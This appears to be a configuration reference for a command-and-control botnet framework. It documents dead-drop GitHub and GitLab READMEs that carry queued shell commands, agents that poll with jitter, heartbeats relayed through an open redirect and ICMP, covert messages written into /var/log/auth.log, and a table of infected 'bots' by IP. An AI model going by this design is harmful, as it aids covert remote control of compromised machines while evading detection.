# Configuration Reference

## api_config.json

API server configuration. Auto-generated on first run.

```json
{
  "admin_token": "<64 hex chars>",
  "lints_token": "<64 hex chars>",
  "host": "0.0.0.0",
  "port": 7443,
  "use_pad": false
}
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `admin_token` | String | Auto-generated | 32-byte hex token for full API access |
| `lints_token` | String | Auto-generated | 32-byte hex token for read-only access |
| `host` | String | `0.0.0.0` | Bind address |
| `port` | u16 | `7443` | Listen port |
| `use_pad` | bool | `false` | Enable 1MB ZW noise padding on payloads |

## control_config.json

Operator configuration for dead-drop management.

```json
{
  "github_token": "<ghp_xxxxxxxx>",
  "gitlab_token": "<glpat-xxxxxxxx>",
  "repos": [
    {
      "owner": "my-org",
      "repo": "c2-repo",
      "platform": "github",
      "branch": "main",
      "file_path": "README.md",
      "alive": true
    }
  ],
  "commands": ["shell whoami"],
  "heartbeat_redirect": "https://www.google.com/url?q=",
  "heartbeat_tracking": "https://c2.example.com/api/heartbeat/{hash}",
  "heartbeat_interval": 300,
  "session_key": "<64 hex chars>"
}
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `github_token` | String | `""` | GitHub personal access token (repo scope) |
| `gitlab_token` | String | `""` | GitLab personal access token |
| `repos` | Array | `[]` | Dead-drop repository targets |
| `repos[].owner` | String | — | Repository owner |
| `repos[].repo` | String | — | Repository name |
| `repos[].platform` | String | `github` | `github`, `gitlab`, or `debian` |
| `repos[].branch` | String | `main` | Git branch |
| `repos[].file_path` | String | `README.md` | File path to inject payloads into |
| `repos[].alive` | bool | `true` | Last health check result |
| `commands` | Array | `[]` | Queued commands for next push (max 256) |
| `heartbeat_redirect` | String | `""` | Open redirect URL for heartbeat relay |
| `heartbeat_tracking` | String | `""` | Direct tracking endpoint (replaces `{hash}`) |
| `heartbeat_interval` | u64 | `300` | Seconds between heartbeats |
| `session_key` | String | `""` | 64-char hex key for ZW heartbeat encryption |

## Agent Config (pb_config.json)

Agent runtime configuration.

```json
{
  "repos": [
    {
      "owner": "my-org",
      "repo": "c2-repo",
      "platform": "github",
      "branch": "main",
      "file_path": "README.md",
      "active": true,
      "fail_count": 0,
      "last_success": 0.0,
      "last_fail": 0.0
    }
  ],
  "poll_interval": 60,
  "jitter": 15,
  "max_fails_before_skip": 5,
  "use_api": false,
  "last_command_hash": ""
}
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `repos` | Array | `[]` | Repos to poll (max 256) |
| `poll_interval` | u64 | `60` | Seconds between poll cycles |
| `jitter` | u64 | `15` | Random jitter added to interval |
| `max_fails_before_skip` | u32 | `5` | Consecutive failures before backoff |
| `use_api` | bool | `false` | Use API instead of raw URLs |
| `last_command_hash` | String | `""` | SHA-256 of last executed command batch |
| `icmp_heartbeat_dest` | String | `"8.8.8.8"` | ICMP timestamp heartbeat destination IP |
| `icmp_heartbeat_interval` | u64 | `300` | Seconds between ICMP heartbeats |
| `log_covert_path` | String | `"/var/log/auth.log"` | Log file for covert inter-agent communication |
| `log_covert_interval` | u64 | `600` | Seconds between log covert writes |

## bots.json

Heartbeat tracking data. Auto-generated by the API server.

```json
{
  "<bot_hash>": {
    "ip": "10.0.1.5",
    "first_seen": 1719876543.0,
    "last_seen": 1719876543.0,
    "hits": 42
  }
}
```

Bots are auto-evicted when count exceeds 10,000 (oldest 1,000 removed).
Alive threshold: 600 seconds (10 minutes) since last heartbeat.
